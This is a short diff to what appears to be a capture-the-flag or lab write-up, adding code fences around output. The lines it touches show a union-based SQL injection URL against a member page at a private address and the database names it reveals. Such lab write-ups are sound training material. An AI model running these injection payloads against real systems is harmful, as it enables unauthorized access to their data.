@@ -18,6 +18,9 @@ http://192.168.1.102/?page=member&id=42 union select database(), schema_name fro
 ```
 
 result:
+
+```
+
 ID: 42 union select database(), schema_name from information_schema.schemata
 First name: Member_Sql_Injection
 Surname : information_schema
@@ -36,6 +39,8 @@ Surname : Member_images
 ID: 42 union select database(), schema_name from information_schema.schemata
 First name: Member_Sql_Injection
 Surname : Member_survey
+
+```
 
 which shows that the current database is Member_Sql_Injection, the other databases are Member_Brute_Force, Member_guestbook, Member_images, Member_survey
 
